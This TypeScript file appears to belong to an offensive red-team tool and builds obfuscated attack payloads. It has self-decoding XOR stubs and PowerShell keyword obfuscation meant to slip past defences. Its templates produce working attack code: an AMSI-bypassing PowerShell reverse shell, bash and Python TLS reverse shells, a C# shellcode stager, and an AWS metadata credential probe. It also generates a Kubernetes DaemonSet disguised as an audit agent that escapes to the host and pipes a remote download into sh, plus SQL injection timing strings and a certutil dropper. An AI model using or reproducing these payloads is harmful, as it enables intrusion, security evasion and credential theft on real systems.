// Client-side Obfuscation and Encoding Engine for Security Payloads

export interface ObfuscationResult {
  encoded: string;
  method: string;
  notes: string;
  decoderStub?: string;
}

// Shannon Entropy Calculation
export function calculateShannonEntropy(str: string): number {
  if (!str || str.length === 0) return 0;
  const len = str.length;
  const frequencies: Record<string, number> = {};
  for (let i = 0; i < len; i++) {
    const c = str[i];
    frequencies[c] = (frequencies[c] || 0) + 1;
  }
  let entropy = 0;
  for (const char in frequencies) {
    const p = frequencies[char] / len;
    entropy -= p * Math.log2(p);
  }
  return parseFloat(entropy.toFixed(3));
}

// 1. Base64 standard and PowerShell UTF-16LE EncodedCommand
export function encodeBase64(raw: string, isPowerShellUnicode = false): string {
  if (isPowerShellUnicode) {
    // PowerShell -EncodedCommand expects UTF-16LE bytes
    let binary = "";
    for (let i = 0; i < raw.length; i++) {
      const code = raw.charCodeAt(i);
      binary += String.fromCharCode(code & 0xff, (code >> 8) & 0xff);
    }
    return btoa(binary);
  }
  return btoa(unescape(encodeURIComponent(raw)));
}

// 2. Hex Byte Array (e.g. \x41\x42 or 0x41, 0x42)
export function encodeHexArray(raw: string, format: "c_style" | "shellcode" = "c_style"): string {
  const bytes = new TextEncoder().encode(raw);
  if (format === "shellcode") {
    return Array.from(bytes)
      .map((b) => "\\x" + b.toString(16).padStart(2, "0"))
      .join("");
  }
  return Array.from(bytes)
    .map((b) => "0x" + b.toString(16).padStart(2, "0"))
    .join(", ");
}

// 3. XOR Key Byte Mask with self-decoding stub
export function encodeXorMask(raw: string, key = 0x5a): { maskedHex: string; pythonStub: string; ps1Stub: string } {
  const bytes = new TextEncoder().encode(raw);
  const xorBytes = Array.from(bytes).map((b) => b ^ key);
  const hexStr = xorBytes.map((b) => "0x" + b.toString(16).padStart(2, "0")).join(",");

  const pythonStub = `# Self-decoding XOR Stub (Key: 0x${key.toString(16).padStart(2, "0")})
import bytearray
payload = bytearray([${hexStr}])
decoded = "".join([chr(b ^ 0x${key.toString(16).padStart(2, "0")}) for b in payload])
exec(decoded)`;

  const ps1Stub = `# Self-decoding PowerShell XOR Stub (Key: 0x${key.toString(16).padStart(2, "0")})
$k = 0x${key.toString(16).padStart(2, "0")}
$enc = [byte[]](${hexStr})
$dec = [System.Text.Encoding]::ASCII.GetString(($enc | ForEach-Object { $_ -bxor $k }))
Invoke-Expression $dec`;

  return {
    maskedHex: hexStr,
    pythonStub,
    ps1Stub,
  };
}

// 4. PowerShell Backtick & Concatenation Obfuscator
export function obfuscatePowerShellTicks(raw: string): string {
  // Randomly insert backticks in cmdlets / keywords (not inside variable identifiers)
  const keywords = ["Invoke-Expression", "IEX", "New-Object", "Net.Sockets.TCPClient", "DownloadString", "VirtualAlloc", "VirtualProtect"];
  let result = raw;
  keywords.forEach((kw) => {
    const ticked = kw.split("").join("`");
    result = result.split(kw).join(ticked);
  });
  return result;
}

// 5. Environment Variable Concatenation for Windows CMD / Bash
export function obfuscateEnvConcat(raw: string, platform: "windows" | "linux" = "windows"): string {
  if (platform === "windows") {
    // Break string into %COMSPEC:~0,1% or concatenated %a%%b%
    return `set a=${raw.slice(0, Math.floor(raw.length / 2))}&&set b=${raw.slice(Math.floor(raw.length / 2))}&&cmd /c "%a%%b%"`;
  }
  return `a='${raw.slice(0, Math.floor(raw.length / 2))}'; b='${raw.slice(Math.floor(raw.length / 2))}'; eval "$a$b"`;
}

// Comprehensive preset payload templates
export interface PayloadTemplate {
  id: string;
  name: string;
  targetOS: "windows" | "linux" | "macos" | "web" | "cloud" | "network";
  category: "reverse_shell" | "stager" | "process_injection" | "lolbas" | "cloud_escape" | "web_probe" | "persistence";
  language: "powershell" | "bash" | "python" | "csharp" | "c" | "yaml" | "raw";
  architecture: "x64" | "x86" | "arm64" | "any";
  mitre: string[];
  description: string;
  generator: (lhost: string, lport: string | number) => { code: string; filename: string };
}

export const payloadTemplates: PayloadTemplate[] = [
  {
    id: "ps1_amsi_bypass_rev",
    name: "PowerShell AMSI-Bypass TCP Stager",
    targetOS: "windows",
    category: "reverse_shell",
    language: "powershell",
    architecture: "x64",
    mitre: ["T1059.001", "T1562.001", "T1071.001"],
    description: "In-memory AMSI scan buffer unhooking with interactive duplex TCP client stream.",
    generator: (lhost, lport) => ({
      filename: "amsi_rev_stager.ps1",
      code: `[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;
# AMSI Memory Patch
$a = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');
$f = $a.GetField('amsiInitFailed','NonPublic,Static');
$f.SetValue($null,$true);

# Connect to Operator C2
$client = New-Object System.Net.Sockets.TCPClient('${lhost}', ${lport});
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush();
}
$client.Close();`,
    }),
  },
  {
    id: "bash_dev_tcp",
    name: "Bash /dev/tcp Interactive Shell",
    targetOS: "linux",
    category: "reverse_shell",
    language: "bash",
    architecture: "any",
    mitre: ["T1059.004", "T1071.001"],
    description: "Pure POSIX /dev/tcp socket redirection with file descriptor duplication.",
    generator: (lhost, lport) => ({
      filename: "posix_stager.sh",
      code: `#!/bin/bash
# AegisOSINT Tactical POSIX Shell
bash -i >& /dev/tcp/${lhost}/${lport} 0>&1`,
    }),
  },
  {
    id: "python3_tls_pty",
    name: "Python3 Encrypted TLS PTY Spawner",
    targetOS: "linux",
    category: "reverse_shell",
    language: "python",
    architecture: "any",
    mitre: ["T1059.006", "T1573.002"],
    description: "Encrypted TLS socket with interactive pseudoterminal (pty) spawning for full TTY evasion.",
    generator: (lhost, lport) => ({
      filename: "tls_pty_agent.py",
      code: `#!/usr/bin/env python3
import socket, subprocess, os, pty, ssl

C2_HOST = "${lhost}"
C2_PORT = ${lport}

def spawn_terminal():
    raw_s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # SSL/TLS Wrapping to evade plain socket inspection
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    s = ctx.wrap_socket(raw_s)
    s.connect((C2_HOST, C2_PORT))
    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    os.dup2(s.fileno(), 2)
    pty.spawn("/bin/bash")

if __name__ == "__main__":
    spawn_terminal()`,
    }),
  },
  {
    id: "csharp_process_injector",
    name: "C# In-Memory Process Injection (VirtualAlloc/CreateThread)",
    targetOS: "windows",
    category: "process_injection",
    language: "csharp",
    architecture: "x64",
    mitre: ["T1055.001", "T1055.002"],
    description: "Reflective allocation of shellcode memory buffer with execute permissions and thread spawning.",
    generator: (lhost, lport) => ({
      filename: "ReflectiveLoader.cs",
      code: `using System;
using System.Net.Sockets;
using System.Runtime.InteropServices;

namespace AegisRedTeam {
    public class Stager {
        [DllImport("kernel32.dll")]
        public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32.dll")]
        public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
        [DllImport("kernel32.dll")]
        public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        public static void Main(string[] args) {
            Console.WriteLine("[*] Fetching stage from ${lhost}:${lport}...");
            try {
                using (TcpClient client = new TcpClient("${lhost}", ${lport})) {
                    NetworkStream stream = client.GetStream();
                    byte[] payload = new byte[8192];
                    int bytesRead = stream.Read(payload, 0, payload.Length);
                    
                    // Allocate RWX memory block
                    IntPtr execBuffer = VirtualAlloc(IntPtr.Zero, (uint)bytesRead, 0x3000, 0x40);
                    Marshal.Copy(payload, 0, execBuffer, bytesRead);
                    IntPtr hThread = CreateThread(IntPtr.Zero, 0, execBuffer, IntPtr.Zero, 0, IntPtr.Zero);
                    WaitForSingleObject(hThread, 0xFFFFFFFF);
                }
            } catch (Exception ex) {
                Console.WriteLine("[-] Stager error: " + ex.Message);
            }
        }
    }
}`,
    }),
  },
  {
    id: "aws_imds_probe",
    name: "AWS IMDSv1 & IMDSv2 SSRF Token Extraction",
    targetOS: "cloud",
    category: "cloud_escape",
    language: "python",
    architecture: "any",
    mitre: ["T1552.005", "T1526"],
    description: "Probes AWS EC2 Instance Metadata Service with session token acquisition to exfiltrate attached IAM role keys.",
    generator: (lhost, lport) => ({
      filename: "aws_imds_probe.py",
      code: `import urllib.request, json

print("[*] Testing AWS IMDSv2 Token Endpoint...")
try:
    req = urllib.request.Request(
        "http://169.254.169.254/latest/api/token",
        headers={"X-aws-ec2-metadata-token-ttl-seconds": "21600"},
        method="PUT"
    )
    with urllib.request.urlopen(req, timeout=3) as resp:
        token = resp.read().decode('utf-8')
        print("[+] IMDSv2 Session Token Acquired:", token[:16] + "...")
        
        # Query IAM Role Name
        cred_req = urllib.request.Request(
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            headers={"X-aws-ec2-metadata-token": token}
        )
        with urllib.request.urlopen(cred_req, timeout=3) as cred_resp:
            role_name = cred_resp.read().decode('utf-8')
            print("[+] Attached IAM Role:", role_name)
except Exception as e:
    print("[-] IMDSv2 probe failed, trying IMDSv1:", e)
    try:
        with urllib.request.urlopen("http://169.254.169.254/latest/meta-data/iam/security-credentials/", timeout=3) as v1:
            print("[+] IMDSv1 Role Exposed:", v1.read().decode('utf-8'))
    except Exception as v1_err:
        print("[-] Host is not running on AWS EC2 or IMDS is firewalled.")`,
    }),
  },
  {
    id: "k8s_escape_daemonset",
    name: "Kubernetes Host Node Escape DaemonSet Manifest",
    targetOS: "cloud",
    category: "cloud_escape",
    language: "yaml",
    architecture: "any",
    mitre: ["T1611", "T1610"],
    description: "Privileged container manifest with hostPID, hostNetwork, and host filesystem chroot mount.",
    generator: (lhost, lport) => ({
      filename: "k8s_node_escape.yaml",
      code: `apiVersion: apps/v1
kind: DaemonSet
metadata:
  name: node-hardware-audit-agent
  namespace: kube-system
spec:
  selector:
    matchLabels:
      app: hardware-audit
  template:
    metadata:
      labels:
        app: hardware-audit
    spec:
      hostNetwork: true
      hostPID: true
      hostIPC: true
      containers:
      - name: audit-harness
        image: alpine:latest
        command: ["/bin/sh", "-c"]
        args:
        - "nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/sh -c 'curl -s http://${lhost}:${lport}/beacon | sh'"
        securityContext:
          privileged: true
        volumeMounts:
        - name: host-root
          mountPath: /host
      volumes:
      - name: host-root
        hostPath:
          path: /`,
    }),
  },
  {
    id: "sqli_time_blind",
    name: "SQLi Multi-Database Blind Timing Probe",
    targetOS: "web",
    category: "web_probe",
    language: "raw",
    architecture: "any",
    mitre: ["T1190"],
    description: "Database-agnostic blind timing verification vectors for MySQL, PostgreSQL, MSSQL, and Oracle.",
    generator: (lhost, lport) => ({
      filename: "sqli_timing_probes.txt",
      code: `# MySQL / MariaDB (5-second delay)
' OR (SELECT 1 FROM (SELECT(SLEEP(5)))a)-- -
admin' AND SLEEP(5)#

# PostgreSQL (5-second delay)
' || pg_sleep(5)--
'; SELECT pg_sleep(5);--

# Microsoft SQL Server (5-second delay)
'; WAITFOR DELAY '0:0:5'--
' AND 1=(SELECT 1 FROM (WAITFOR DELAY '0:0:5')a)--

# Oracle Database (5-second delay)
' AND 1=dbms_pipe.receive_message(('a'),5)--
' AND (SELECT count(*) FROM all_objects WHERE rownum < 5000000) > 0--

# SQLite (Heavy computation delay)
' AND 1=like('ABCDEFG',upper(hex(randomblob(500000000/2))))--`,
    }),
  },
  {
    id: "lolbas_certutil",
    name: "Windows LOLBAS CertUtil File Dropper",
    targetOS: "windows",
    category: "lolbas",
    language: "powershell",
    architecture: "x64",
    mitre: ["T1105", "T1218"],
    description: "Utilizes legitimate signed Microsoft binary certutil.exe to download and decode remote payload.",
    generator: (lhost, lport) => ({
      filename: "certutil_dropper.bat",
      code: `@echo off
:: Download encoded stage via signed certutil binary
certutil.exe -urlcache -split -f http://${lhost}:${lport}/stage.enc %TEMP%\\stage.enc
certutil.exe -decode %TEMP%\\stage.enc %TEMP%\\agent.exe
start %TEMP%\\agent.exe`,
    }),
  },
];
